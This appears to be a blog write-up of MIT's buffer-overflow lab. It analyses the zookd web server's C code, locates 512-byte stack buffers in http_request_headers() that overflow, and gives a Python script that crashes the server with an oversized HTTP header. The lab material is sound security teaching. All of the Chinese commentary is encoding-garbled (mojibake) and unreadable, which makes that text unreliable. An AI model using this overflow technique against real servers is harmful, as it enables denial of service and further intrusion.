<h1 id="0x01-Lab1-Buffer-overflows"><a href="#0x01-Lab1-Buffer-overflows" class="headerlink" title="0x01. Lab1: Buffer overflows"></a>0x01. Lab1: Buffer overflows</h1><h2 id="Part-1-Finding-buffer-overflows"><a href="#Part-1-Finding-buffer-overflows" class="headerlink" title="Part 1: Finding buffer overflows"></a>Part 1: Finding buffer overflows</h2><p>é¦–å…ˆç»™äº†ä¸€ä¸ªèµ„æ–™ï¼š<a target="_blank" rel="noopener" href="https://thesquareplanet.com/blog/smashing-the-stack-21st-century/">Smashing the stack in the 21st century</a>ï¼ŒåŸºç¡€è–„å¼±çš„åŒå­¦å¯ä»¥ä»”ç»†çœ‹çœ‹ï¼Œç¬”è€…è¿™é‡Œç›´æ¥è·³è¿‡ï¼Œç„¶åæ˜¯ Exercise 1ï¼š</p>
<blockquote>
<p><strong>Exercise 1.</strong> Study the web serverâ€™s C code (in <code>zookd.c</code> and <code>http.c</code>), and find one example of code that allows an attacker to overwrite the return address of a function. Hint: look for buffers allocated on the stack. Write down a description of the vulnerability in the file <code>answers.txt</code>. For your vulnerability, describe the buffer which may overflow, how you would structure the input to the web server (i.e., the HTTP request) to overflow the buffer and overwrite the return address, and the call stack that will trigger the buffer overflow (i.e., the chain of function calls starting from <code>process_client</code>).</p>
<p>It is worth taking your time on this exercise and familiarizing yourself with the code, because your next job is to exploit the vulnerability you identified. In fact, you may want to go back and forth between this exercise and later exercises, as you work out the details and document them. That is, if you find a buffer overflow that you think can be exploited, you can use later exercises to figure out if it indeed can be exploited. It will be helpful to draw a stack diagram like the figures in <a target="_blank" rel="noopener" href="https://thesquareplanet.com/blog/smashing-the-stack-21st-century/">Smashing the Stack in the 21st Century</a>.</p>
</blockquote>
<p>å¤§æ¦‚æ˜¯é˜…è¯»  <code>zookd.c</code> å’Œ <code>http.c</code> æ‰¾æ¼æ´ï¼Œæç¤ºå…³æ³¨åœ¨æ ˆä¸Šåˆ†é…çš„ bufferï¼Œå¹¶å°†ç­”æ¡ˆå†™åœ¨ <code>answers.txt</code> ä¸­<del>ï¼ˆğŸ‘´ï¼šâ“ï¼‰</del></p>
<p>é¦–å…ˆçœ‹ <code>zookd.c</code>ï¼Œæºç æ¯”è¾ƒç®€æ´ï¼Œæ ¸å¿ƒé€»è¾‘åœ¨ <code>run_server()</code> ä¸­ï¼Œé¦–å…ˆä¼šè°ƒç”¨ <code>start_server()</code> åˆ›å»ºä¸€ä¸ª http æœåŠ¡å™¨ï¼Œä¹‹ååœ¨ <code>run_server()</code> ä¸­æœ‰ä¸€ä¸ªæ— é™å¾ªç¯è°ƒç”¨ <code>accept()</code> æ¥æ”¶è¯·æ±‚å <code>fork()</code> å‡ºå­è¿›ç¨‹è°ƒç”¨ <code>process_client()</code> å¤„ç†</p>
<h4 id="process-client-ï¼šå¤„ç†å•æ¬¡-HTTP-request"><a href="#process-client-ï¼šå¤„ç†å•æ¬¡-HTTP-request" class="headerlink" title="process_client()ï¼šå¤„ç†å•æ¬¡ HTTP request"></a>process_client()ï¼šå¤„ç†å•æ¬¡ HTTP request</h4><p> <code>process_client()</code> çš„é€»è¾‘ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œä¸»è¦æ˜¯è°ƒç”¨ <code>http_request_line()</code> è·å–è¯·æ±‚å¤´ç¬¬ä¸€è¡Œï¼Œä¹‹åç»™åˆ° <code>env_deserialize()</code> è§£æç¯å¢ƒå˜é‡ï¼Œä¹‹åè°ƒç”¨ <code>http_request_headers()</code> è§£æå‰©ä¸‹çš„ headerï¼Œæœ€åè°ƒç”¨ <code>http_serve()</code> å¤„ç†</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">process_client</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span><br>&#123;<br>    <span class="hljs-type">static</span> <span class="hljs-type">char</span> env[<span class="hljs-number">8192</span>];  <span class="hljs-comment">/* static variables are not on the stack */</span><br>    <span class="hljs-type">static</span> <span class="hljs-type">size_t</span> env_len = <span class="hljs-number">8192</span>;<br>    <span class="hljs-type">char</span> reqpath[<span class="hljs-number">4096</span>];<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *errmsg;<br><br>    <span class="hljs-comment">/* get the request line */</span><br>    <span class="hljs-keyword">if</span> ((errmsg = http_request_line(fd, reqpath, env, &amp;env_len)))<br>        <span class="hljs-keyword">return</span> http_err(fd, <span class="hljs-number">500</span>, <span class="hljs-string">&quot;http_request_line: %s&quot;</span>, errmsg);<br><br>    env_deserialize(env, <span class="hljs-keyword">sizeof</span>(env));<br><br>    <span class="hljs-comment">/* get all headers */</span><br>    <span class="hljs-keyword">if</span> ((errmsg = http_request_headers(fd)))<br>      http_err(fd, <span class="hljs-number">500</span>, <span class="hljs-string">&quot;http_request_headers: %s&quot;</span>, errmsg);<br>    <span class="hljs-keyword">else</span><br>      http_serve(fd, getenv(<span class="hljs-string">&quot;REQUEST_URI&quot;</span>));<br><br>    close(fd);<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="http-request-line-ï¼šè§£æ-header-ç¬¬ä¸€è¡Œ"><a href="#http-request-line-ï¼šè§£æ-header-ç¬¬ä¸€è¡Œ" class="headerlink" title="http_request_line()ï¼šè§£æ header ç¬¬ä¸€è¡Œ"></a>http_request_line()ï¼šè§£æ header ç¬¬ä¸€è¡Œ</h4><p>ç°åœ¨æ¥çœ‹ <code>http_request_line()</code>ï¼Œå…¶é¦–å…ˆè°ƒç”¨äº†ä¸€ä¸ªå‡½æ•° <code>http_read_line()</code> ä» TCP è¿æ¥ä¸­è¯»å–ä¸€æ•´è¡Œï¼ˆread() ä¸€ä¸ªå­—èŠ‚ä¸€ä¸ªå­—èŠ‚åœ°è¯»ï¼Œä¸€ç›´è¯»åˆ° <code>\n</code> å¹¶è¿”å›è¯»å–çš„å­—èŠ‚æ•°ï¼Œå¯¹äº <code>\r</code> è‡ªåŠ¨è·³è¿‡ï¼Œå¤±è´¥åˆ™è¿”å› <code>-1</code>ï¼Œä»£ç å°±ä¸è´´äº†ï¼‰</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-title function_">http_request_line</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">char</span> *reqpath, <span class="hljs-type">char</span> *env, <span class="hljs-type">size_t</span> *env_len)</span><br>&#123;<br>    <span class="hljs-type">static</span> <span class="hljs-type">char</span> buf[<span class="hljs-number">8192</span>];      <span class="hljs-comment">/* static variables are not on the stack */</span><br>    <span class="hljs-type">char</span> *sp1, *sp2, *qp, *envp = env;<br><br>    <span class="hljs-comment">/* For lab 2: don&#x27;t remove this line. */</span><br>    touch(<span class="hljs-string">&quot;http_request_line&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> (http_read_line(fd, buf, <span class="hljs-keyword">sizeof</span>(buf)) &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Socket IO error&quot;</span>;<br></code></pre></td></tr></table></figure>

<p>ä¹‹åè§£æè·¯å¾„ä¸è¯·æ±‚ç±»å‹ï¼Œä¸»è¦å°±æ˜¯ç”¨ <code>strchr()</code> è¿›è¡Œåˆ†éš”ååˆ¤æ–­ï¼Œå¹¶å°†ç»“æœå†™åˆ° <code>env</code> ä¸­</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Parse request like &quot;GET /foo.html HTTP/1.0&quot; */</span><br>sp1 = <span class="hljs-built_in">strchr</span>(buf, <span class="hljs-string">&#x27; &#x27;</span>);<br><span class="hljs-keyword">if</span> (!sp1)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Cannot parse HTTP request (1)&quot;</span>;<br>*sp1 = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>sp1++;<br><span class="hljs-keyword">if</span> (*sp1 != <span class="hljs-string">&#x27;/&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Bad request path&quot;</span>;<br><br>sp2 = <span class="hljs-built_in">strchr</span>(sp1, <span class="hljs-string">&#x27; &#x27;</span>);<br><span class="hljs-keyword">if</span> (!sp2)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Cannot parse HTTP request (2)&quot;</span>;<br>*sp2 = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>sp2++;<br><br><span class="hljs-comment">/* We only support GET and POST requests */</span><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;GET&quot;</span>) &amp;&amp; <span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;POST&quot;</span>))<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Unsupported request (not GET or POST)&quot;</span>;<br><br>envp += <span class="hljs-built_in">sprintf</span>(envp, <span class="hljs-string">&quot;REQUEST_METHOD=%s&quot;</span>, buf) + <span class="hljs-number">1</span>;<br>envp += <span class="hljs-built_in">sprintf</span>(envp, <span class="hljs-string">&quot;SERVER_PROTOCOL=%s&quot;</span>, sp2) + <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure>

<p>ç„¶åè§£æè¯·æ±‚ä¸­çš„å‚æ•°ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* parse out query string, e.g. &quot;foo.py?user=bob&quot; */</span><br><span class="hljs-keyword">if</span> ((qp = <span class="hljs-built_in">strchr</span>(sp1, <span class="hljs-string">&#x27;?&#x27;</span>)))<br>&#123;<br>    *qp = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>    envp += <span class="hljs-built_in">sprintf</span>(envp, <span class="hljs-string">&quot;QUERY_STRING=%s&quot;</span>, qp + <span class="hljs-number">1</span>) + <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>ä¹‹åè°ƒç”¨ <code>url_decode(dst, src)</code> è§£æ request URLï¼Œè¿™ä¸ªå‡½æ•°ä¸»è¦å°±æ˜¯æŠŠ URL é‡Œçš„ <code>%ab</code> æ¢æˆ <code>0xab</code> ï¼ŒæŠŠ <code>+</code> æ¢æˆ ç©ºæ ¼ï¼Œç”± <code>src</code> æ‹·è´åˆ° <code>dst</code> ï¼›æœ€åå°†ç»“æœå†™å› <code>env</code>ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">    <span class="hljs-comment">/* decode URL escape sequences in the requested path into reqpath */</span><br>    url_decode(reqpath, sp1);<br><br>    envp += <span class="hljs-built_in">sprintf</span>(envp, <span class="hljs-string">&quot;REQUEST_URI=%s&quot;</span>, reqpath) + <span class="hljs-number">1</span>;<br><br>    envp += <span class="hljs-built_in">sprintf</span>(envp, <span class="hljs-string">&quot;SERVER_NAME=zoobar.org&quot;</span>) + <span class="hljs-number">1</span>;<br><br>    *envp = <span class="hljs-number">0</span>;<br>    *env_len = envp - env + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="http-request-headers-ï¼šè§£æ-header-å‰©ä½™éƒ¨åˆ†ï¼ˆå­˜åœ¨æ¼æ´ï¼‰"><a href="#http-request-headers-ï¼šè§£æ-header-å‰©ä½™éƒ¨åˆ†ï¼ˆå­˜åœ¨æ¼æ´ï¼‰" class="headerlink" title="http_request_headers()ï¼šè§£æ header å‰©ä½™éƒ¨åˆ†ï¼ˆå­˜åœ¨æ¼æ´ï¼‰"></a>http_request_headers()ï¼šè§£æ header å‰©ä½™éƒ¨åˆ†ï¼ˆå­˜åœ¨æ¼æ´ï¼‰</h4><p>è¿›æ¥é¦–å…ˆæ˜¯ä¸€ä¸ªå¤§å¾ªç¯ï¼Œæ¯æ¬¡å¾ªç¯éƒ½ä¼šè°ƒç”¨ <code>http_read_line()</code> è¯»å–ä¸€è¡Œ header è¿›è¡Œè§£æï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-title function_">http_request_headers</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span><br>&#123;<br>    <span class="hljs-type">static</span> <span class="hljs-type">char</span> buf[<span class="hljs-number">8192</span>];      <span class="hljs-comment">/* static variables are not on the stack */</span><br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-type">char</span> value[<span class="hljs-number">512</span>];<br>    <span class="hljs-type">char</span> envvar[<span class="hljs-number">512</span>];<br><br>    <span class="hljs-comment">/* For lab 2: don&#x27;t remove this line. */</span><br>    touch(<span class="hljs-string">&quot;http_request_headers&quot;</span>);<br><br>    <span class="hljs-comment">/* Now parse HTTP headers */</span><br>    <span class="hljs-keyword">for</span> (;;)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (http_read_line(fd, buf, <span class="hljs-keyword">sizeof</span>(buf)) &lt; <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Socket IO error&quot;</span>;<br><br>        <span class="hljs-keyword">if</span> (buf[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;\0&#x27;</span>)     <span class="hljs-comment">/* end of headers */</span><br>            <span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure>

<p>ä¹‹åæ˜¯è§£æ <code>key: value</code> å‹çš„å€¼ï¼Œé¦–å…ˆæ˜¯ <code>shrchr()</code> æŒ‰ç©ºæ ¼è¿›è¡Œåˆ†å‰²ï¼Œç„¶åå°† <code>key</code> è½¬æˆå¤§å†™ä¸” <code>-</code> è½¬æˆ <code>_</code> ï¼Œä¹‹åè°ƒç”¨ <code>url_decode()</code> è§£æ</p>
<ul>
<li>è¿™é‡Œæˆ‘ä»¬æ³¨æ„åˆ° <code>value</code> æ˜¯ä¸€ä¸ª<strong>ä½äºå‡½æ•°æ ˆä¸Šçš„å­—ç¬¦æ•°ç»„ï¼Œé•¿åº¦ä»…ä¸º 512</strong>ï¼Œè€Œè¯¥ HTTP server æ‰€å…è®¸çš„å•è¡Œæœ€å¤§é•¿åº¦ä¸º 8192 å­—ç¬¦ï¼Œè¿™æ„å‘³ç€<strong>æˆ‘ä»¬å¯ä»¥å¾ˆè½»æ˜“åœ°é€šè¿‡ä¼ å…¥ä¸€ä¸ªè¾ƒé•¿çš„é”®å€¼å¯¹å‚æ•°æ¥å®Œæˆæ ˆæº¢å‡º</strong></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Parse things like &quot;Cookie: foo bar&quot; */</span><br><span class="hljs-type">char</span> *sp = <span class="hljs-built_in">strchr</span>(buf, <span class="hljs-string">&#x27; &#x27;</span>);<br><span class="hljs-keyword">if</span> (!sp)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Header parse error (1)&quot;</span>;<br>*sp = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>sp++;<br><br><span class="hljs-comment">/* Strip off the colon, making sure it&#x27;s there */</span><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strlen</span>(buf) == <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Header parse error (2)&quot;</span>;<br><br><span class="hljs-type">char</span> *colon = &amp;buf[<span class="hljs-built_in">strlen</span>(buf) - <span class="hljs-number">1</span>];<br><span class="hljs-keyword">if</span> (*colon != <span class="hljs-string">&#x27;:&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Header parse error (3)&quot;</span>;<br>*colon = <span class="hljs-string">&#x27;\0&#x27;</span>;<br><br><span class="hljs-comment">/* Set the header name to uppercase and replace hyphens with underscores */</span><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(buf); i++) &#123;<br>    buf[i] = <span class="hljs-built_in">toupper</span>(buf[i]);<br>    <span class="hljs-keyword">if</span> (buf[i] == <span class="hljs-string">&#x27;-&#x27;</span>)<br>        buf[i] = <span class="hljs-string">&#x27;_&#x27;</span>;<br>&#125;<br><br><span class="hljs-comment">/* Decode URL escape sequences in the value */</span><br>url_decode(value, sp);<br></code></pre></td></tr></table></figure>

<p>æœ€åéƒ¨åˆ†å°±æ˜¯å¦‚æœ <code>key</code> ä¸ä¸º <code>CONTENT_TYPE</code> æˆ– <code>CONTENT_LENGTH</code> åˆ™åœ¨å‰é¢åŠ ä¸Šå­—ç¬¦ä¸² <code>HTTP_</code> åå­˜å‚¨åˆ° <code>envvar</code> ä¸­ï¼Œå¹¶è°ƒç”¨ <code>setenv()</code> è®¾ç½®  <em>ç¯å¢ƒå˜é‡</em>  ä¸­çš„å¯¹åº”å€¼</p>
<ul>
<li>è¿™é‡Œæˆ‘ä»¬æ³¨æ„åˆ° <code>envvar</code> ä¹Ÿæ˜¯ä¸€ä¸ª<strong>ä½äºå‡½æ•°æ ˆä¸Šçš„é•¿åº¦ä»…ä¸º 512çš„å­—ç¬¦æ•°ç»„</strong>ï¼Œå› æ­¤åœ¨è¿™é‡Œä¹Ÿå¯ä»¥å‘ç”Ÿ<strong>æ ˆæº¢å‡º</strong></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">        <span class="hljs-comment">/* Store header in env. variable for application code */</span><br>        <span class="hljs-comment">/* Some special headers don&#x27;t use the HTTP_ prefix. */</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;CONTENT_TYPE&quot;</span>) != <span class="hljs-number">0</span> &amp;&amp;<br>            <span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;CONTENT_LENGTH&quot;</span>) != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">sprintf</span>(envvar, <span class="hljs-string">&quot;HTTP_%s&quot;</span>, buf);<br>            setenv(envvar, value, <span class="hljs-number">1</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            setenv(buf, value, <span class="hljs-number">1</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>é‚£ä¹ˆä¸‹é¢æˆ‘ä»¬æ¥åˆ° Exercise2ï¼Œå†™ä¸€ä¸ª exp æ¥è®© zookd ç¨‹åº crash æ‰ï¼š</p>
<blockquote>
<p><strong>Exercise 2.</strong> Write an exploit that uses a buffer overflow to crash the web server (or one of the processes it creates). You do not need to inject code at this point. Verify that your exploit crashes the server by checking the last few lines of <code>dmesg | tail</code>, using <code>gdb</code>, or observing that the web server crashes (i.e., it will print <code>Child process 9999 terminated incorrectly, receiving signal 11</code>)</p>
<p>Provide the code for the exploit in a file called <code>exploit-2.py</code>.</p>
<p>The vulnerability you found in Exercise 1 may be too hard to exploit. Feel free to find and exploit a different vulnerability.</p>
</blockquote>
<p>æˆ‘ä»¬ç°åœ¨æ¥æµ‹è¯•ä¸€ä¸‹è¿™ä¸ªæ¼æ´ï¼Œé¦–å…ˆç¼–å†™ä¸€ä¸ªæ­£å¸¸çš„ HTTP Get è¯·æ±‚ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>(<span class="hljs-params">host, port</span>):<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    sock.connect((host, <span class="hljs-built_in">int</span>(port)))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Connected to the server. Sending request now...&quot;</span>)<br><br>    payload = <span class="hljs-string">b&quot;GET / HTTP/1.0\r\n&quot;</span><br>    payload += <span class="hljs-string">b&quot;arttnba3: &quot;</span> + <span class="hljs-string">b&quot;rat3bant&quot;</span> + <span class="hljs-string">b&quot;\r\n&quot;</span><br>    payload += <span class="hljs-string">b&quot;\r\n&quot;</span><br>    sock.send(payload)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Receiving response...&quot;</span>)<br>    rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    resp = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(rbuf):<br>        resp += rbuf<br>        rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Got response:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(resp)<br><br>    sock.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) != <span class="hljs-number">3</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Usage: &#123;&#125; host port&quot;</span>.<span class="hljs-built_in">format</span>(sys.argv[<span class="hljs-number">0</span>]))<br>        exit(-<span class="hljs-number">1</span>)<br>    exp(sys.argv[<span class="hljs-number">1</span>], sys.argv[<span class="hljs-number">2</span>])<br></code></pre></td></tr></table></figure>

<p>æ•ˆæœå¦‚ä¸‹ï¼š</p>
<p><img src="https://s2.loli.net/2022/11/29/PujgG7EJVMmOiz1.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬å°è¯•åˆ©ç”¨ <code>envvar</code> è¿›è¡Œæº¢å‡ºæµ‹è¯•ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    sock.connect((<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">8080</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Connected to the server. Sending request now...&quot;</span>)<br><br>    payload = <span class="hljs-string">b&quot;GET / HTTP/1.0\r\n&quot;</span><br>    payload += <span class="hljs-string">b&quot;arttnba3: &quot;</span> + <span class="hljs-string">b&quot;rat3bant&quot;</span> * <span class="hljs-number">512</span> + <span class="hljs-string">b&quot;\r\n&quot;</span><br>    payload += <span class="hljs-string">b&quot;\r\n&quot;</span><br>    sock.send(payload)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Receiving response...&quot;</span>)<br>    rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    resp = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(rbuf):<br>        resp += rbuf<br>        rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Got response:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(resp)<br><br>    sock.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ° zookd æç¤ºäº†å­è¿›ç¨‹æ”¶åˆ°äº† <code>signal 11</code>ï¼ˆä¹Ÿå°±æ˜¯ <code>SIGSEGV</code>ï¼‰ï¼ŒåŒæ—¶æˆ‘ä»¬æ”¶åˆ°çš„å“åº”ä¹Ÿä¸ºç©ºå­—ç¬¦ä¸²ï¼Œè¯´æ˜æˆ‘ä»¬æˆåŠŸè§¦å‘äº†è¿™ä¸ªæ¼æ´</p>
<p><img src="https://s2.loli.net/2022/12/03/oWwStCVeFG5Qd6Z.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<blockquote>
<p>MIT å…¶å®è¿˜è´´å¿ƒåœ°æä¾›äº†ä¸€ä¸ª <code>exploit-template.py</code> æ–‡ä»¶ï¼Œè®©ç¬”è€…è¿™ç§ä¸æ€ä¹ˆä¼šç”¨ socket å†™è£¸ HTTP è¯·æ±‚çš„èœé¸¡å¯ä»¥å‚è€ƒï¼ˆç¬‘ï¼‰ï¼Œ<del>ä»–çœŸçš„ğŸ‘´å“­æ­»</del></p>
</blockquote>
<p>å°†æ–‡ä»¶åæ”¹æˆ <code>exploit-2.py</code> åæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤è¿›è¡Œè¯„æµ‹ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make check-crash</span><br></code></pre></td></tr></table></figure>

